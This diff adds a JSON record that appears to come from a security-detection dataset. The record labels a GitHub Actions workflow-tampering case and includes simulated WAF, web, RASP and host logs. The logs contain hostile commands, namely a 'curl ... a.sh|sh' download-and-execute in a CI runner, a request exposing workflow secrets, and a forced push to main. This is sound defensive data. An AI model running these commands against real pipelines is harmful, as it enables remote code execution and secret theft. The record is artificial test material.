@@ -1,0 +1,57 @@
+{
+ "unit": 1126,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "GitHub Actions workflow 篡改（PR 分支注入 run 步骤后强推）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-15 12:36:45",
+   "source": "waf",
+   "log_id": "WAF0504065",
+   "content": "/api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh",
+   "event_id": "1126-WAF0504065"
+  },
+  {
+   "timestamp": "2026-07-15 12:36:47",
+   "source": "web",
+   "log_id": "WEB0507344",
+   "content": "/api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh",
+   "event_id": "1126-WEB0507344"
+  },
+  {
+   "timestamp": "2026-07-15 12:36:48",
+   "source": "rasp",
+   "log_id": "RASP0557713",
+   "content": "https://app-rails-145.ops-corp.com/api/v4/projects/ops/ci/pipelines {\"workflow\": \"release.yml\", \"secrets\": \"GI",
+   "event_id": "1126-RASP0557713"
+  },
+  {
+   "timestamp": "2026-07-15 12:38:16",
+   "source": "hids",
+   "log_id": "HID0546272",
+   "content": "curl 10.20.5.19/a.sh|sh /bin/sh curl 10.20.5.19/a.sh|sh <== /bin/sh -c 'runner step' <== Runner.Worker.Worker",
+   "event_id": "1126-HID0546272"
+  },
+  {
+   "timestamp": "2026-07-15 12:39:20",
+   "source": "hids",
+   "log_id": "HID0546278",
+   "content": "git push -f origin main /usr/bin/git git push -f origin main <== /bin/sh -c 'git push' <== Runner.Worker",
+   "event_id": "1126-HID0546278"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
